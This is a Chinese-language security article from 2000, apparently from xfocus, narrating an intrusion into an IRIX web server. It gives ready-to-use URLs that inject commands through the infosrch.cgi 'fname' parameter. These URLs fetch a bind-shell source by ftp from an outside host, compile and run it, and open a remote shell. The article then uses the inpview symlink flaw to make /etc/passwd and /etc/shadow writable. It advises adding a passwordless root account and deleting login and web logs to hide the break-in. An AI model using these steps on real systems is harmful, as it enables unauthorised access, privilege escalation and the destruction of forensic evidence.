---
title: "一次尝试IRIX的过程(nobody shell)"
date: 2000-08-10T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-64"
---

(quack_at_xfocus.org)

一次尝试IRIX的过程(nobody shell)

   

by quack<quack@21cn.com>

[http://www.xfocus.org  ](http://www.xfocus.org�0�2�0�2/)安全焦点

   


   有个家伙跟我说过某个站点是IRIX，有个infosrch的cgi漏洞，OK，假定该站为[www.targe.co.jp](http://www.targe.co.jp/)吧


1、[http://www.targe.co.jp/cgi-bin/infosrch.cgi?cmd=getdoc&db;=man&fname;=|ls%20-la](http://www.targe.co.jp/cgi-bin/infosrch.cgi?cmd=getdoc&db=man&fname=|ls%20-la)

   这就是它的利用方法了。其中ls -la是我们要运行的命令，我不太习惯在web shell里面干活，还

   是要弄出一个shell有个$来得方便些，于是就用ftp。


2、[http://www.targe.co.jp/cgi-bin/infosrch.cgi?cmd=getdoc&db;=man&fname;=echo%20open%20www.xfocus.org>/tmp/a](http://www.targe.co.jp/cgi-bin/infosrch.cgi?cmd=getdoc&db=man&fname=echo%20open%20www.xfocus.org>/tmp/a)

   ……

   ……

   上面这些其实就是把这一段东西输进/tmp/a中：


   open [www.xfocus.org          ](http://www.xfocus.org�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2/) <---------别当真，这里没有这个东西;)

   user quack quack              <---------我的用户名密码

   binary

   cd /home/quack

   lcd /tmp

   prompt

   get bindshell.c               <---------这是一个绑定shell的东西，网上到处有

   bye

   

   [http://www.targe.co.jp/cgi-bin/infosrch.cgi?cmd=getdoc&db;=man&fname;=|nohup%20ftp%20-ivn%20</tmp/a](http://www.targe.co.jp/cgi-bin/infosrch.cgi?cmd=getdoc&db=man&fname=|nohup%20ftp%20-ivn%20</tmp/a)


   这里呢，就是在运行ftp取回东西了;)这么拿文件的话在xferlog里不会有记录。


   [http://www.targe.co.jp/cgi-bin/infosrch.cgi?cmd=getdoc&db;=man&fname;=|/usr/local/bin/gcc%20/tmp/bindshell.c%20-o%20/tmp/abc](http://www.targe.co.jp/cgi-bin/infosrch.cgi?cmd=getdoc&db=man&fname=|/usr/local/bin/gcc%20/tmp/bindshell.c%20-o%20/tmp/abc)


   编译


   [http://www.targe.co.jp/cgi-bin/infosrch.cgi?cmd=getdoc&db;=man&fname;=|/tmp/abc](http://www.targe.co.jp/cgi-bin/infosrch.cgi?cmd=getdoc&db=man&fname=|/tmp/abc)


   运行……


3、现在我们可以telnet上去了


    bash# telnet *.*.*.*  12345

    Trying *.*.*.*...

    Connected to *.*.*.*.

    Escape character is '^]'.

    sh -i；

    $ id；

    uid=60001(nobody) gid=60001(nobody)

    $


4、利用IRIX的inpview漏洞，该漏洞的描述如下：


   某些版本IRIX下的inpview会在/var/tmp/目录下不安全地建立临时文件，这些临时文

   件名并不随机，用户可以建立一个符号链接到其他文件，利用inpview的

   setuid-to-root权限覆盖其他文件，同时对应文件权限被更改成0666。


   漏洞利用程序就不贴了，大家自己看看，很简单的，总之编译完成之后。


   $ ./a.out /etc/passwd;


   copyright LAST STAGE OF DELIRIUM jan 2000 poland  //lsd-pl.net/

   /usr/lib/InPerson/inpview for irix 6.5 6.5.8 IP:all


   looking for temporary file... found!

   ……

   ……

   

   $ ./a.out /etc/shadow;

   ……

   ……


   就把这两个破文件的权限都改成0666了，往下该干什么活不用我说了吧……

   加个uid0的帐号，密码为空，修改系统，删除sulog\weblog\wtmp\utmp里的记录以及把/tmp下面的

   东西干掉，把passwd和shadow恢复回原样，再touch一下。走人，睡觉。


   btw:一句题外话，现在IRIX的telnetd漏洞很猛呀，还好要有irix系统编译exploit，少了些小孩做坏

   事，还有，那天stardust说还有许多IRIX的lp默认密码为空，我看了一下，的确如此，印象中mixter

   写了一个小段子专门搜索网上lp空密码帐号的……
